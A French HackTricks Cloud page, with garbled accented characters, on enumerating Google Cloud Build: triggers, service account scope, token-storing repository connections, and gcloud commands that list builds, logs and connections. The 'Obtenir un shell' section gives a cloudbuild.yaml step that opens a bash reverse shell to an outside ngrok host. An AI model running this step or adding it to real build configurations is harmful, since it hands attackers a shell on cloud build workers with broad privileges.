# GCP - Enum√©ration de Cloud Build

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

Google Cloud Build est une plateforme CI/CD g√©r√©e qui **automatise la construction de logiciels** et les processus de publication, s'int√©grant aux **d√©p√¥ts de code source** et prenant en charge une large gamme de langages de programmation. Il **permet aux d√©veloppeurs de construire, tester et d√©ployer du code automatiquement** tout en offrant la flexibilit√© de personnaliser les √©tapes de construction et les flux de travail.

Chaque D√©clencheur Cloud Build est **li√© √† un D√©p√¥t Cloud ou connect√© directement √† un d√©p√¥t externe** (Github, Bitbucket et Gitlab).

{% hint style="success" %}
Je n'ai pas trouv√© de moyen de voler le jeton Github/Bitbucket √† partir d'ici ou des D√©p√¥ts Cloud car lorsque le d√©p√¥t est t√©l√©charg√©, il est acc√©d√© via une URL [https://source.cloud.google.com/](https://source.cloud.google.com/) et Github n'est pas accessible par le client.
{% endhint %}

### √âv√©nements

Le Cloud Build peut √™tre d√©clench√© si :

* **Pousser vers une branche** : Sp√©cifiez la branche
* **Pousser une nouvelle √©tiquette** : Sp√©cifiez l'√©tiquette
* **Demande de tirage** : Sp√©cifiez la branche qui re√ßoit la PR
* **Invocation manuelle**
* **Message Pub/Sub** : Sp√©cifiez le sujet
* **√âv√©nement de webhook** : Exposera une URL HTTPS et la requ√™te doit √™tre authentifi√©e avec un secret

### Ex√©cution

Il y a 3 options :

* Un yaml/json **sp√©cifiant les commandes** √† ex√©cuter. G√©n√©ralement : `/cloudbuild.yaml`
* Un seul qui peut √™tre sp√©cifi√© "en ligne" dans la console web et dans l'interface en ligne de commande
* Option la plus courante
* Pertinent pour un acc√®s non authentifi√©
* Un **Dockerfile** √† construire
* Un **Buildpack** √† construire

### Autorisations SA

Le **Compte de service a la port√©e `cloud-platform`**, il peut donc **utiliser tous les privil√®ges.** Si **aucun SA n'est sp√©cifi√©** (comme lors de la soumission), le **SA par d√©faut** `<num-projet>@cloudbuild.gserviceaccount.com` sera **utilis√©.**

Par d√©faut, aucune autorisation n'est donn√©e mais il est assez facile d'en donner :

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Approbations

Il est possible de configurer un Cloud Build pour **exiger des approbations pour les ex√©cutions de construction** (d√©sactiv√© par d√©faut).

### Connexions & D√©p√¥ts

Les connexions peuvent √™tre cr√©√©es via :

* **GitHub :** Il affichera une invite OAuth demandant des autorisations pour **obtenir un jeton Github** qui sera stock√© dans le **Gestionnaire de secrets.**
* **GitHub Enterprise :** Il demandera d'installer une **GithubApp**. Un **jeton d'authentification** de votre h√¥te GitHub Enterprise sera cr√©√© et stock√© dans ce projet en tant que secret du **Gestionnaire de secrets.**
* **GitLab / Enterprise :** Vous devez **fournir le jeton d'acc√®s API et le jeton d'acc√®s API de lecture** qui seront stock√©s dans le **Gestionnaire de secrets.**

Une fois une connexion g√©n√©r√©e, vous pouvez l'utiliser pour **lier les d√©p√¥ts auxquels le compte Github a acc√®s**.

Cette option est disponible via le bouton :

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Notez que les d√©p√¥ts connect√©s avec cette m√©thode ne sont **disponibles que dans les D√©clencheurs utilisant la 2e g√©n√©ration.**
{% endhint %}

### Connecter un D√©p√¥t

Ce n'est pas la m√™me chose qu'une **`connexion`**. Cela permet **diff√©rentes** fa√ßons d'**acc√©der √† un d√©p√¥t Github ou Bitbucket** mais **ne g√©n√®re pas un objet de connexion, mais g√©n√®re un objet de d√©p√¥t (de 1re g√©n√©ration).**

Cette option est disponible via le bouton :

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Stockage

Parfois, Cloud Build **g√©n√©rera un nouveau stockage pour stocker les fichiers du d√©clencheur**. Cela se produit par exemple dans l'exemple que GCP propose avec :
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Un bucket de stockage appel√© [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) est cr√©√© pour stocker un fichier `.tgz` avec les fichiers √† utiliser.

### Obtenir un shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### √ânum√©ration

Vous pourriez trouver **des informations sensibles dans les configurations de construction et les journaux**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### √âl√©vation de privil√®ges

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acc√®s non authentifi√©

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post-exploitation

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
